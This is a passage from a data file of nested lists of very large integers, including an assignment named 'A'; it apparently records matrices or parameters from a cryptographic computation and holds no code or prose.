24617185766009588357101766482180107038039776511120629934313436536296579418487142979268967071886061600892736915602540925909925158576880070687274776319097886850, 28873228184149927853845969756215699518516955681240479431047486112346199116592492821563363258333852978693121868003194386897778895971454638771954062324042174874, 23238345593321215415113157886479971950702390567987336315933475554492706507737304291072539102152452112886077612660235176436328684404696621581100762939195759060, 25709054208710802545648091827586202105917827684585945209782557453325377782849313062238139602737229720523530867371200828694246024247508042886548947739882211109], [28726767758420404595722670297129854341060815733128259709346850417617632451585031413684763933782908058079701834794167755577102542062329670546826279560406517658, 25785102204826666159919516076251735805486919021996805466303233689766483444232318199980459334283433764879783319641975972549369892745685219775183705029120466385, 23151416787556926348464125150472947418580826207348510807479955947289466178450509407881380290519180276778984752864117713071067482198329558162740513189131127681, 23726154834265659521723542848620500967424864622057418935301431940439123191893079197726195973555592253483348398428311231341708285438826388999674175649600753350, 28424355653296844891469147016233652344461936971339543499993239732582003778093013661107714002753400371440483620227629815739079408425560757024030379972401937201, 21973854055796716098260351110130140116371003193112762387962100672515294461602664270448219924343926692876562540198525716838576241075368132586197266474862774358, 28063716188717368292699410442317938687575168157724137627751274199797176816067154837084697874365933946278792224754498241315134400035238936612555694962847895551, 29107803287406671425539462333285925811401695869006607694703317698416755993306143265723366547095579950707857179158473594308545691189048651171661110166238810340, 24534986673153313631375325594613427699508246416629181034981375294231919518852908615577482489999306338803435349810376850647052824573252033141319054177658856682, 31591249880532344897487162084585628015231193282492326804453305827275963960405280316079519558637363099144106084096462795138703689380997084288162388926045723530, 29362421169444886067681610102527038266179207484390392370439643735185657616588711966674207760672199494904967109861832697247192545410437931082430147642303775881, 22313881239806518733142887127935861825793115084459946498066773326085323305115968545937780673001066628803373616217761982413348253619362440193311416265015910222, 28510325926256034807259321774454613540573129778847959546679730301572587189110521796709487538203359265711286366459249769444268427474195086463463933345250504961, 25741949363320975014000509493876433430857612407000522996481833020522173604772688406731930950638937063254245128076748737707108104051439905345063839847938642419, 27186591247012406167309437730657369084979110993426700029886200083218047666709179883124527390977196985860428190155382748576250879592378704880133681457385975595, 26303308201836801161700310161079451848037673375648206167090430309625882255376868602414936261760167415898336386291454785798023163782294310576961336025590552010, 29524430230953558759872833500544473059011459227701141878377494690238514101169650853329410451010205778433233639073527446766560929770726604325676081323014605360, 30747555083806539025966664751613119273759624698104777103259887494179673599772962229734172957946312559541685686806569565324292030820019496353513158627514858049, 23008028766361229975978663461649127588543516996581114780842205973180955020351970526316915024666726412488300502337122967966515643946143041631592296567573674351, 25026821474789527874075535577799169907694165833970825914765727102130822655416617018463631687568638436460972776972054831388351462285283235423535454706837426604, 26140850632009734636843387016944362906329058721094132063736973500767935169643798080859050653153629639649570703788744093595810536155883412249436240954750545909, 23331898864472787864173184735134458737822034265126821925446297679114798836200257271289828734981679985258502475515054646993703422161392038556491091194186759685, 25007871144859220377466573242328581981776638275923945583633595086355615333527182478163572644328742298777844802762296394271742367292455590693274272933237035911, 28995739953180522084759712560065809869155405867117316595559202238423924611619721430618363974301330937041069434973060460981647986065008654099737984860165627134, 26153586972651792752805015636928552003659994609183520323272198935302296125773740956594374227975588976470475752834305106120533766053581166622299526491821842556, 26553481625461876879485045847789334876914808255615574029385066575157950648553482535204666511269260250830524775648267376147196325688651036653410421535634524214, 29492676063278927678747441054187399060794859514699817671973967116387268912964058191681694504735513411219189695533100019687226761610300726508938051284775468512, 29052152776275570626702471457105542951559549286998184744013261824875702252806123460372743548236499835774789804747370283239878913139039864855416168258252747643, 26147414358976201216890909605453954293837174237479042998908839811765528430858355555620133235074273088369935909006431743524877155219055457994497995091211436377, 32884466096553221430083383797825772490289453340996103984115426729914045663467625404217379376906767390098719669261504591930670184105824788156236905553303454543, 25055159075143831824670237844865270578374567968098046416541987262630243332259468659614771058914147802580968056482257365764878015399939503773150968718040198298, 25390637298703085522531896980640782525921712165760095028834200008086057512465597634358208410354112792802943301976439791813499297286558465892894199431798011359], [27186436535496164524547025076201176389003253757247072668389005500865893949050508392704012304376293676395381461481864302196233678434185055771649835364240792027, 21050566111553351615354492610537138113764563440264751353776009744273024220035464000214062852064371822213273124412538193783661246668884209532780177721053483652, 20643497809898824261460033125238208693907247019268481070975389473979633049182513818257563821438131784555308594593632081597690665618530849661022380100674046169, 21932728774023820433165429006614143919600253475798029913694767407639096751827602496806847785004573977451705620019723071501679431977487684389659372669483371991, 24554551474747684056968008842771833600444921460287857202475213847101083440651799411477202672484572010513609027235885000618194448967551021222906197230492223295, 21923193613668115068882381526710278645808201140526600355408678720972133550748735473326720169797461574594168071787069935014862208496578410874712514174683799090, 26747322237747331931443963535862231166847068300553476290749038635215016692827513645343841805121248840995816331134688957900997007492148336003194141404545153638, 28704240571893499655957737759741265108747996686543107538569465967463421852070040706414113197820974652988342118585755320257096363649819905058094187142488041946, 23327497069396163176023930226546126826289015067690903101048178699033891492368364299469114218498458528480814933962008042390969170240648417726577009365906747721, 28379092410582271673202243071715545889439915059443905440902609663373427062026295785242846533679480193733715242369774148093070342733482797041112258055163269298, 26261336253315133308744154500494649518013094452536237970279199135108787160060029661066347290134812477334801301801317661400500103868215732677333223443361548578, 22969104434231372043975048946429906463177461492903144173176159742485871673379242686411752844359487749146574303877047703119479010227977615013653282557945676299, 27782916721972991745933603942225954170161160873149920262141607135202370502784640123881023407972031157165528771650564490745793926707916401577422140488593820189, 24351521710966615140545546121568014330035792607555827481000027557316908749570179047263041863176538798801775003045374964223301008134563555634466115618171325537, 27425853157426744064811372122288674582318620140183533181668935451437812197269356333274654725258497481736309492690640545039627110566358411103666851313050630603, 25601509735572991340249947535215563587586538172409846955380201189442278794249593022358755327227259449371504439589047013718855628560359828672823619591929918978, 27254518385977813639064567060108035777291979270482024581749308522143450043484327544939171794289605646688381088069905826755860644184609800694734725135097246074, 30488146525869553986285187419158070539492494499611625829705936521929106408037058516083315398565105921569238802729000073800094640447676962027795800672783722647, 22445548366170225284283824907526708046790910642494455647222111940928129460257499493653219607347075820520660182065002947775792826345731547758093878375953301355, 22828600579751505346725635761400981640218645230828003360751958113225557180032354234845757352369512080320044837824014250445289639165186030258767826589111880880, 23224170040575071754459964716731714835091958560553204579606690189369788589466548551150245044268207726846295835557642770013103808710383950091932865221604772591, 23378315925527165042398653097373497131472821896967666972037108838024818360649388026685940231612342305289376499493489154805071449601718747854728188064050526918, 25245556409620627987185909924369243461240699373182397760567124462376389851998178898643449495229058650939981134718342249126726185856135752786986956655936178157, 27258858842207627367447109147213139932516599886306476240427572111041606693787865882216264068584161161801312268495500584735768242138871019755590461142951194321, 24224217517603173567135573271152349631551501156683763050451101729642520184153636388061264594704522763285380048871868584140130717753963356781867645615913690507, 23263832908882788669757014783008982738994398875979103259094637915966121144700172869302011483917232971854624557817048475649667620181784055257468519592793887100, 28579133981481026696417641399373760288335919244609888503829772967010650414281906937213023864426520859080731116562113645884721848436118751545301518977432225642, 29210799690033491911374678425246410973477460458162107010504938568293242798350627296187078368423804324856831876578027331817434433690514667135610649310361948780, 22544282125092139385029098046256779816134795197911328524697532625894586605987699646680508719805384757910571327535617593041725307863089618756785158865724801382, 31241390580150857539775942788305634422130694010968515981310131413884989200707854600039743443255065530969580820423590347970690920903462964662358255746245515853, 23188705149205177709169857814574860363528197116112226189201252872217416958381901223862285580281778999158320532204798793858663021628602872015732495482641339836, 24565798057591548245226411790675857311435575462553943605285104814573837106846870976090860414143595983545042046072629464425182658757267248200257695107819274498], [27419807733025467983884501130868111298967518764609826889606595698289822933740811170215873246132049511529349943706737072600952695034688581540033319606540943656, 26318390072925507646993540634317779296862558153411310543471987573610627920181010608944754553644022266610812295324900701484760373399643339521471403418751521278, 26686512440196369556016781998546673143839296168695301704529470330105430338365882416493679770684282474229483210277720457871843184829635944327497382988974862716, 22054035643069259050806658227608460640191255305663484325089780195213789363501474494700015394742722421683608805045892046476046824689181463161716300993749964842, 30320828399423281404430701195945736748464338333171095116290041243436877138413494569589703485675890506254373614351639739725761179196066055755907826927280911893, 24927448752097004568236315946540488268637917000869179209633595559096465262127341047536385168138798758964052833340497070626910647072366546963090149568793163850, 25997986423659299756455947708992153756881859638314831642951530204675584929672466189370712149469627017976369204935554464588340047150224485550310263186494874212, 29428935274208206980871076721289315257632178602843720731672265931024864289058864000506241382638695035646835420862370597121061262989568502230376294134110467613, 26656947055218769786480259126684805767491956312274487109281354910598771814835876851895660036839763051896117721851467611868751258799243184933582372200806266224, 31970004441413100050906484499579324232484032543862099566717281501600012578866470046919745827118680831452633348760489588385623063286800914701471981867388912195, 26943936423075607133967513362327324758568400363297728090310193563014280182495987295520474077513341386525907558608470146903928252262392945530771237179938238743, 26141931447344480652170005352670965674838052120081718983246138351076440291113841931556359288006821879032463215222459694706650644849745219164740692593331322012, 30546058042843387519724020438637588420300129132185106588961072368243660870523996862051895255791484462382219748022836434816863250599345472796281272437317716614, 27283176611181150265407275502320604960442993717029488371191332061955415699931556509158144842295708829653122924351645030586065866237971985971449338758679513760, 27608995076667037426381872443896219219839382897971393128715399646896741162091494288429842504944262224598867897392663957654755403758585426478871272913241527786, 29127851362730988388490381998751880500026262455613704638674198775271585508567606560695488019885841754447066684036127650301326581359379966653252620864033061950, 28181045691986965275310766132052680345804398801296791001238159953678645764570787685238075662618429280411498928749511329590514949626549550659107490817911966270, 30494852258684589255307107617560785642108578744534027084458181135863028089523973779211872728571448251742900086756970138629716849926857443094796873151093294334, 25292294790350995577127224848821816341051517163730035210298978580575527186342753912692774836562835430285200834819532662154855257472736232072842280714898491842, 26148414284219767752332775838782348216077895579287127134374709841387371887776971963056399441208009669380140652913806915288557770763087955246594208952856990177, 27236885024046450787268381227393091896306063953904146652333998606553913480689207341675536575479896541244972219518728641767345315414583663340886946296568972999, 25946003683006246752193322754920026882430296862891589285235911777283069527291630183527271762439057727682497274032979360967654340714526480553859317889179850222, 28087394996011667631172853174138701858124604389620295483305416139953265990295997299293148490846455598311673131388100907784753792727423166177094597093695754365, 30496756920636181287154790240862121828691375058115953778029975485094754498284559284675227090400906488730859453849934552289976500167717572916905143056563681761, 25880761585979298774862671456301742619691567430975243772387227274166974986054609013837250197914712852217982746084433382616630297322925778263263130845621105902, 24784036014186664814168088903740523204903666442289774801548384360353021894100977950264033319380694858171618704903551997586094992381646404572809739806454289947, 28588182001086877842995227462820560946901815970516697721572373428265649820629118936662570106717270523488254099972904844667898442569929552994223293612351784956, 29254951402137040604091434465405396035319525851134379597023668772157005350875406486551106472700443068915086776440823744601969849263944926765694283305142977718, 28194527002677033855842892689308032985127147467718341575583647588722595606945059727411880927264282291030272871978581423041200362418867236217584041680283448753, 32854086552532565519868597088114577577143381426796807796251886404811298681533572005808247691073922339236782545745393395247646476699175167821171099327246401167, 26448668876048600525098472595381258963868523812760185876878445354687054408409256543135078533065824408336544907167875318003188860922083710184374666712548922423, 26300930098036614487950699217867604308841799221942397599725322323852497320402519123698816783775884139362799105791667800067763670316086568910043101127117181363], [29970736118930747072188504058789713961570536591347542834725081032750097056625589984686956563988795242222687781687826162467580508698710922358128995691373489059, 25679089887627771286649020723557736128934133182240806582518052922307213903814940228535308345908611686286440671435808629905496470725183681302871944889778371997, 23684000263214671260729566198937914385923387681336621711308942142357258112610883464056396930833687456369645960956518460245938817784148105581748664275437060446, 25454214966229932685662703163361898228850586258602451968583603491763261392300382970459987716088505029294562871742737795080788346197834777841240803128484604286, 28749983228612203488840676443565437716753044945786857696266325646287273982427925769801375084605970993167481468447286456436325244865318275671851810926799938645, 23181819334261880827444250611627429697399083642170871512156584084677425879012425916292511662608476473410587405257129366777862182665217894057862458442201196544, 30634040557899678138168424848540166599656663276389562300201980257931428162051205382550207409887585956680612500136199488977803538851711964848276294559922081095, 32034097370744216209579791172690328550376606467076225819123713357478424636853658851858882997771234622942047796895034054888058420148525705952248266174571529928, 26363788425480545280074643271288985419891412350420700240564831476714408912629321951287008432033549752875451775119652958825736919044092054873394654350431483255, 35251934605617817799936681600889061584692461039658688074925523636742180244074352196491330679150714578437546202646285997967247227712751149752509940001443872400, 33273873522193001347172528735515743146783189786431465261738914944523688108204938907558936302787818623457623640482358752414094791296865787990023731550074934588, 27611322034980563827392693490141045867090627521221899123564913277336541672713283754230014655935914103310337140989713276384953727645817956292578374481909943530, 28776748507826796443404614269005038558313805650154590210530924598725195028688214297600586011688312120388471740302677671061686759340394744343923444298138445225, 27740660642708079765521216959266559093060784903376732038868649665608565173696191778789713629285910253637490589747985587807837137594205489209948491869294288177, 30738007395238723124145693273337154444689589731205898198394052679922001836972072544263758687162595016402706508424253697219233647365320229705439010186022013444, 29491561009411473076038449191107279663595518579064376497997303817124969052308940401686682844082853513998927689344956830076690860464565725786942326962412131848, 31430781708232324670077820201934959406184069107399643700546507385694927621865913222417992260620375411225508943802906596046974360500644239133171517110761406022, 35041796320885241201393735167766373729481875096547308014078302402847569260318164377201332213627456436218137123117087143388757516760061430142297660285385142197, 25480317921222375617992638453343304161805524659451972373595564791093949096137590223883252572283388656967272897837141419566687659643664980461196044059672770880, 27327463678094597177246373224058910228064236901887602060561234485835084944146452034289495646909437387808355368179796032372606617149144223740481225931979117571, 27276844744934523955710694801788609385807482459569396561339648653224901233503694643786187778863281975779624038440902687135389893537149083239817620550047666213, 24900651058399595599494677245339968936823194056197556682127535742408096491865433798939073744682143802054544438655322749223296294521810639439849971485034402666, 28163007174130238930578769129101072320231043494373579412967995377012606815321657275995535128322063923162577354141108649948880204310690870549394151076814106606, 28041033798059741552833204324753220776452061889044828431149539844790149544858371577159534730333580506188592854218166219619399547026043634887502337001449706130, 30370318166104949110701779079960713538038991131155566586446086274231453035434735760541300795255184610056398147677245316478747773563852844912765808440868019056, 24576991675260172098848617747026301106518160723860717571388787336660524176710157124611370404833850378607464543420204677737022246624759920771176489930944847482, 31921916936816199786775578558882717054750535736164456484444664331871940155872813488191461648122678054396809567385512406185079468910837622822558056776515703786, 33569681175494116791022089986759138614043715874810477531492598862638476870787874319914206355588330749990196149776318473421180364466274633865946520798184897195, 27153274417894568499900900502619269254136455978685562668949054867045516577083511344345718530771217793536642603949908369357174998859360453128157010909895212644, 32964576082951103594973614510103784205058937933097909605885045170627407712318814019576386932998446555713009675384187367020763216351708449902883031083824106397, 27138700981577103148324588776272550297695961796991613996491908900497541571720796456049468268508626992840082901873151278504435787664865185980565602183599636454, 29105644351551800004241280599566554451353608877262474964490974924591783138064939912730993565532592757141507614298243017921331600318308588525047026182356928039], [27739927922663362780494123543235988056834404217699467626233191680331167176968329895556613694617018027647231117878555679299151761331096362641723809768446222140, 27452650123920526928018322205132583765651784843232858395265487859047200621776891145438239766537759572987289909169053753284233629692116796329744602830244098322, 29264056849610041170209794635677579888300109601244030006441654575114439127965056017604746485478086745744943476909088299322431919505937366153349382160845009100, 26770790140772768733410817749830277796579725335189000148768205405348619452007448071367597614363909856676242489581852906173324944195698140813984510638953558177, 29705449860302041561404655051879451676561871845065221536299219855216154966812538985639184621221646054740414664599499714116312246002758875220775296248273899362, 26632948577304402873774107789727864960778501888132749977555152759616271301013466701382916797160897359656949790826134511740545148140464015142517302361645507966, 26254061076833891161565089555006152405478171274522733705189410612513221231928388341509652151394251069593096860906090754479848625260982116842112569569012344644, 29797845936587299915469916444547873989827758729266421712011283161383345539399972604019556705220426771046396287698808162794298925957658193905677950239255926414, 28975398945825825371244947276685405119384791995062132084587595698666255291942178926266209870774457565446821204715606314184209017432550986147703866582908814185, 37186432680630310543023056895269146568216125059904135422383904386634961207920758790207634266494526052121768650030007029573799081178531915187267481626595163088, 34263950361183912593664313452986601795754409648506316519313247649611830021360541058887108720191093956942583168522020205187675490718347252459639580784729866093, 28668555066055192328147646404928537533860001716347642574857097594217143782960085672960274709242528558194161642446757165026315322904343847853280126938029664489, 33068713413541393951783144410597805752668924629083605430833794094809862786581424277845423678816552974704363123367718625644921811614434652241788675707945001624, 28605777908670906759978762605922169581163245415218636988549055926193450480958969146517263879551902655511630666588637632261101558192775662456154274862536290533, 27900560401692855572777703345641972090450193926100163610728252111763637423694056711791272627919554853658007144593451555214844710440937549745078755050224681045, 29042502337615161932871005835053003627833889749717648720432175457746147948533547310577507451107116909555545606747350459133987271531192144668326238261265757433, 34853125787858397297233050514811977816380095633599782305149608390691156417944190270218836635767898472034891213192490418768822785900108310452711440696067200981, 29994349615962883488031110307555007214882683466010638386050820000452972238939823072984388348438161648369118320968948951509375506713862003059815725820610873997, 29104078271131644396579660602293312063892229439321012593657761892200514968879939369750554863211135538371569314955788827624007164074818316280316132454895070740, 28951039527729576099265247414963435751565392984198667573574070912412046220840039445195115503987468089831665685147168794263465981952991472430297669686665696462, 28430949359200324883238590351136064848994602831755122447557882778686044911133262322213239459635516747134974327997696827523592687534154717966430009362599507965, 27759196304240185093105286007234477630234627596264808705786076443756921130601418816982908459577171435740592730109571659234206252628205384685364762654695858967, 27543304108026306797161309446626383005451424804871113588252133026843015973852716652014877594616597015246576946430168812649710902606532083410979778859609996548, 31464968110857847593254575063617295502731140083942789147046095456010581911566353692500382124405896015578456899587882114139256823458941328656248812276067315543, 29424039230900932649622363162024726222622734911854621302354298278441384082030556412055150438664259404352550571107060018796272699487843098404585622453742146977, 26355496085213860793753188667809226803447665480624323957344884097338360313949553800381145559173555227038429373490146145369059840774361464662369511629190329758, 31075203775794451846943412168122045492089248796716210183491675408946332910845282587638001926273124308887585284800873511907339087978244694211605596561680090175, 30272527198118940988273068406531048653932518109028128739175875828842522350229451129147907447816136599287934413301000921266398458392742888596459689468764357508, 29047797637092113889777292621417451748321317417891659068329803776600456831303169966744633466780053210065687889978039919053301220965239353761474590002906961168, 36087373712303117811050405822818529030507958328127463645938783297488221117551936719965696777364236462311268837199078160188290053738501136559111066751225487467, 27571351083001284433223795576903899142143691832148196630983904143232973953203702612708612165197773964473701555666338305419331706270185270959867392817020970003, 31346501159126786928963196083066833181704132231801734020805628091568292114559943752647941891310546803652309980007680517468938265056226470163996202486130533658], [27998144178030034437159898689721479362348176480786711369342478978996430014016122208311307529283893222556902531223841372501174326240258473282596413383035460166, 22817032308339602708531540562790954884134816996179849266761289023726411108223228195089981471781659187853963566715928777424344439787659835231953507244233896922, 24678015824998092953336466754329931649390785998391314448759526277286090285680638179524003273791261220412286463295737389856363989006772396010222523051928652592, 26044752576459967295447594500500448630086218643475532461604089397603357869694427228325386556285056284967825170360638791031207269864514028841215113775744034452, 28196362001475914472117285403849666079157510929760971913521005995883231784436825824615570790437613476521933748904126555685923090851705143358761210116119096868, 24570317482334374253499896912567646501151445597091790253736569740174353606107516660481904984972574025898018431737950983836662879886513365714443784714132674443, 27655647465315553218841449530142832214814978104739836667367424210932192464204509679048257229996134156399358348745857724198321497306046093484584032149071785398, 29004382971148753075115131213109936399091832766685523716507777906994109794857765091150341369297204181514327486306011967794561922899748167595710073984938743988, 25476018803060293891584383852052439007464871784601520651329961629154381565663934406963318119273427391040086542719025123681664991590601927366476670120894226458, 33380290334477848651995753700917615401076293468925741056486574148043563847623765592693697542139470534346710584838957020585054293576512626416054922333730729796, 28483200714129565577859504170280075700637458510820609919766783881964319100004627528799074382605444473417616102684359012712511717705350874998030897143765627289, 26098225583124228520114647456056428344504789057711157238543814507860704156712869308916857289886854346219800259035995860462393697541449772033331837266022130215, 30890563530458035392939381520327947881897472842847318222938614110383417584651543371565602115134367277540589043216977734361602246337159581594756319195013560557, 26709768826743863832758486084162259820627616794511252179466574234872879001194825276363950355823702726895088394103785393086076087658239726643544511461933362301, 28368909797912224023730876368882262206999232975447620258699574226372852255057188344504970768607620095729617098470569354509615026811425590994309255858892140764, 24376621191789236231667798469682816385820426224191360465791040137256607597912887275765393156729785667609477336667365670307213229685016706910872417653263740505, 29874457005553765109447500240512966015202709222277843973651185813553959803718677849149470663378372220114256363535731889546374503129973850668251109140868278045, 30973100666329572743251984877605843737545582464388086676103073149425037605627311684650194036047664601555072676763576248982052582866890531042956470978252142214, 24603245107775631121665058737937778518786498210662874030976625004495338443869902013581971063002822404360522914536166471705249276222533054681151922489065652814, 24551817035162444533259462817136444140305822712718366824270023600429875581803738014784781427029250784733656170517923647738402610059504350922360066031658844947, 24892348302073900569998625487291936831931956346913501225790806265919399375908432411913574397306102323953122263860684007874500204014963693760322658938972228764, 24081684829604299518597456672083795307489648854485324699681040647428289158839692600298899083633364979281677614482611817337637353715612775130432447305707958398, 29620091810205621690471150692723623994149803007075662755412568688505237274100722463630049699434311184942744686976005663053056385885035301705444686822617500579, 27324084341870565699127390661820204280762273314889849510480736784706491892984636011796046137580738891677008297893413576493654856806627926716367974076955464726, 23738529067196509977832830722200543401719788719240582639438724618556933785749363144060995235689769118291907704057718603951236772900395533852998753580772257190, 26960680564096390832172681699219230096311314737045124775442177237509359713660985396963780747988602941519734550711457523375288103216046228483695571286716044789, 28784548962281242965744078716648820576709707969540156743456348690137185722271687140133023831915257733341613658377931669118102630328162635054199434718729969564, 27136830758244169571202354454294429479874975300454007708690294355567414069235997976757033076933839790402659765424257292388186362792288270320014214463112479826, 23943552022709055420897507035041969253214440875530751044245874300129403156683164649189187776012290306502636631024851692786957115663958249699203152315216252123, 33776922585629371155091546304623199375275302542161645007499687490316255401998056380754335402406361154520751712141788378182491152342423008955363102800468242038, 24525037468773096482562661165523872973422924208008062439057790304658581811813446963001231291898993517705792565900822043584737091506477540256031171692936012534, 28164337659963623457435631722043987781842715207090321323308085753908158525309431875528801328643587588712029017187415373195917032401556798545651892375261226499], [23476260032818858750757575277366925020787381188526918536736162477244055668893650991416116269991758141302731385533879852240551721604898184948542001947716473044, 18365863685663944266694298236124234821211961158453561433629467500835104606440784838803621691640601770711842621565721889991180780955871535786045862924971072304, 15714093247589236479001486198911771120282028930512575994057244322881066671127340548335715341217906229128506025741206819502173542794427963566599502548956832490, 21391556922990826358932307471843673097426767580345954956736811984462899166053688490636155815766572670821582017108558327107739297615670516079082730949976104263, 23362352227505889107423672834439956291998929041140943409343168032040014551590227485196396526364710303801540695224220478788019728890091937021474796771139347964, 16349546974174260193370983639498871232788661993870505762275685876568839424134928293517660192321597045159743293056808044423477368269768367722522431238858501266, 19680645248929518501366619082706449197424013816289617458545972944241146879735661545657900897921463893538905075193576390856620622686579350071259901909846414447, 24799862963894861668054066145194791960775686236043719632959393136885361120435172026254187264499332090786951864650697989500422706570344145297238034612889709942, 21423800684109292062007118588939270117825076203288214835048453894474330842417431647368353531058049200084464264158194104160247164875636400707179490013794131466, 26466692544936313603561954007544800414539435060326738955959055866591002299281969747481882654994633831048212472428035175306658637612958807730328016717581838721, 24510819138253855873874034124750122066323045643417893131189055215008415892523180535742346573705390589262927144614832856123971611498337349572413111175396579483, 22859247032606403288447661101879344914631276245636422238269049773152040393340047693472890853703792461139325626254647236463741103173875770586083301990466248138, 22043144235943212490133504476155118373687542155494443297573663996901909752903064379652923425259371382461370700585164274103500995021736747051585091545015758163, 25066605652336476350002524647038293433732193631569265689109731949191268499156074527798163261813772452574714484582598431468970887331534180626413622651869810151, 21831973264650680248042868986877143047981894664052475447432372832564146197189495042864256662243774729865607517566764321574126930289475053837283663257982606187, 23305241323963351520089038369693258233196091434865620122718431594564407805098006735398932328399512119127338812963902433960751717142202451657264909659588330933, 21882436987151248624069380895088307721997527643330606499980296242039744362635668712577884654309271303144578164226823891796120380081916025970949280377437922354, 25960547706828945567611109376985405389604359949127138012021651450713090316981207732807915180907663209470673895077956630027711886845776794322609947164608830432, 19583597214550385852061071436615368863439222375713566958674656214925834822712761194186236499819382751324294534108089977418148521228912056603917105043961130025, 20200785741719874290405571542882288532497646322933128967962590666821536211963390077849306243341297159802654837690459182172043877509903155968407622507985726779, 18700946753408500238626871766586746564728271250114147057441402676129234380937499372559372422558536377430140199975082176028062587282331492945330436691978296468, 17997214902859141123035095111025117331435533433399692026022516378876882900974230020608308003614006389114759139227749966838061268682787542012693496048344185621, 17207401340098398607850940363376230825789704655919527671145820726875152991513934111086278950133406239848777243756034831414016311465266738577120173994164051661, 23587418931130942943696603280667942230007678360226417336815490312652938151854213250887084317141046948777759028821439318903137989509952710745344450324308624657, 18958459654538908583484310634874858641513300269337978735334943044270218083617891928807992247316108238114367204931348038252796502084839972498001705191014318850, 18987289909984571945676282582997508285501196296999040316051153198055895452994598282254764448658544521700257715333949215475167484779994883683091671730695238601, 23451577392820078147295381468762956253824032783824979142908759728387794636330440107928906454112953534148278588179519457267453617083833033855097025810653088799, 22577093628031856584203529968507833802802293089621803080331314830890566755424084940667998306527003794726438071221466245051426447957162865793043180786218989888, 22262170298157550862335275773356929311425169426581514510367279013118051319905693105305314492327228940999531540299930344541317075750342854524679642253854240584, 26741378543177523776249245300359887558325956244414780794269024220712206573576813280922933224162675466671256959599850973603908870588673549402458214965260398061, 18582390042985698139264013895860227153184024265954181982165121269733059686782722807854331064150525245706280077907799075560896464524901701930877084175519615056, 20828659952027751169758355539375658594985268314754163451795667637778515489437962628947210033953614292942673077390729584373615557689783759535256381862548658525]]A=[[11371375339087742579617017585389032979638430881806098395175871720925885743020589954486708621608016089934230097414866473930664882387919075022971124476634753, 9997953552087834446832021035179532232430888780702129230509593051956259135802068791817731267445447634260551786293020704445727035752288054019573449183479706, 2060277614795502456239486203959632886827760781572500201803720589342707317456776545628818663873465857048165165489322682236152268757219451104759716187414976, 4618668429284546927748312408864171336064620261007399796843368491210817320869120686710139830128458681610512911818503286829041156867804852336728714475001580, 5483582238401823539769044920789725072676942556482816193340515305664671780686564866581989457126119286560073837046638771516521767320577916836790733401119427, 5363985177215796673887983185150491933326241430652839942503303005963274458660909698890780423149651820727794655948568587550619365512350872137583379928202415, 2128205232325951785352853434278972184071489281739565974619559372701892079020766715379280314156411849927698720297071503133324287447229080240642138972352089, 2734956429847227135619075903065497142029389671547511236149257348838489016167860962638504610017146313716288691038383743609174018926791074281190215068730829, 4741693243018405265460607743955148295270573467959466021582574939751046705526837011373351386545519702529638909667030883115664670590642064283189437843517532, 6424758471837875633638789667102003810261395851937862842364476550048220439327537279294245744704086040450688205349336777823518377970434771207595748120118845, 6887083672480020038602586423949885243905140908730890051245682745078935792555436286143200548074107857436428042394630561570362535793957340945282886112818821, 7480839950468981791210490619295791441214489568517207070418372928775073324152641246437842957900836902810799706485072515845529403989487858409171147248579097, 9699811737816186608907573940000411332622992161470190589425784301357009254386454404072465336707309605999025857087589158835817504900786829858693850762464305, 10987416664753396780857348869220376454968097316153692169103876902502705510131033530145509523546443896237476167292832411743442046010101375024256752038267024, 13307734380963850745686897833794589955609306120731558433945403843738951991102950675279637829815645201668409221029654706047116918203189186708094218749002282, 5519706698692406355129313085933602347191380999421125994149015043904338867118760284920728093400960266370386801180919980951833414945732028585984457202329509, 6920038859547487462546474901842922759544701860733680979061284129507073485637958110578225465479073773370404751094033829929802267579443602573893738135949760, 8977569899599468477846482208914738338783302429927723392887302331038932657239715392159826600235472419191321984760570538825183274215180002916636217379907305, 9641348438346077301921841049031096105196452191450807450945409217880257951326361274058926948383168633024377172028277650669849412490795683892805596234687346, 2609044448690812302592250557569007554272702155722402489910989142412914300119577921169729874163236168644303523444064774704981965154536400101536279553647659, 11880941459544382988205650614360809410435637068340612773584112019640150300832443238490330597599677745912214154819284222615628577353561805412127196735590335, 9619334113427115305670219573199864177988754741288395841297379424046011424680352673555022272916770715156359326611014052666819442898946523835918891732996431, 7885851421046632653715938059105136159984843889695809072734549056548807097161572722948824294150680582050948486076412214870754878842838274224532821422085849, 9924424131071882681754507288086476616147488115078581916591899225942962198582936882690278185151299945599860045350079722083343492943585553567048920206182638, 279859874544087356662199818458853995134124429834970656493613119610016052937000853919996083066111308494826096280415322565665978378056215892039681643447319, 9667300377732918750337432730311002256387121261148123153042537973816299710639645359924661288810757812642886552009285139830197182313991418562860353802716498, 5715997122503059995747192889454731167161225955028416753724068053967463247423232096581171962299358366551809838845021866409578119742126902695741788724616830, 7236048383879384014420850416366118951058943323001288904125197080951593095283433051976299072209907013609700711565842189116924255395310686401239093790921756, 2901117640983811003154562327462359049056614272310950085827487217662738008353591474494314513130528487279482560298950499074143757358363141058990182362224958, 9280443512583602197550822680203069411472510632565553325505158360457102782898523212873848985600678736350924506663986649837946988314259628049097379691305824, 454510867367603331177010327438043477330481310943267247006975034606510039137614938580896054975923458855772428413046874908731780544972316028957570324047430, 9100604391499828372239576401677512733914731070798755209979726914469979321139035225831226973828746631200651089351049880564749839057712782094683261412142956], [4066849802608308846158694141445127543355561835952521658507656212509903266408906992484493646192159026271205113014011548245493838513477670122079113189616567, 1572942263061345265617598741511569682323973687548711746613848729720445414821742047267547623295462289386587224990232555677157340589798764400787912144738616, 3174323995173095570706715917317756346681188307289717284529097459082947717678855753660524932941447472633140352369717408696799948817576020277571847875929979, 203215087065247513639164158351041954287566830354385457380861367309478766420242524152486376930369214004110748433562784335718839660519682885352883126613078, 9473254680255952766084893918622497378313644437279868876841255386314604059297509888955247397941561232461173473327664416572703923638664221232604640423695024, 5500507964317520381115738509489351933539991248488491008754406501492385383100912553887028850545354937412969849045984659872358738556800908831413451088396495, 7666994689802910803758870709961785441607964241926006485477074819353616248703931681895456769741202852591622958425262805175714111377807819252547408508751908, 6768267491284737584359155850179733187967410372494189720402950709591943072289154491055862677808255592386233962477032895315498528338372045852650601479693509, 422946338170233014779972883207324075875699728911977492820509594338839271349006205016119365195380026449417723614072442541511604379955121542506966137306188, 1679332977986071181293067778528329758169462781720899917909053772193279705894207701182807295386579711463753000696856314799819667523332265442796821640863211, 7763347571650696277299437500572826048850877491476428456603550113830374935427156440889383644040386358093744546130768700305122213631842325195871740018772001, 11719232473778671577951994831086595257496691678025626878996938085586099038176109590117806552635802551386906753590279897270834786687612401217351673913801773, 5877868784398823999248713444701170865080844799209972299135205154297407665856200067247381173904338443229361586382419735958754976441545725993454889203436343, 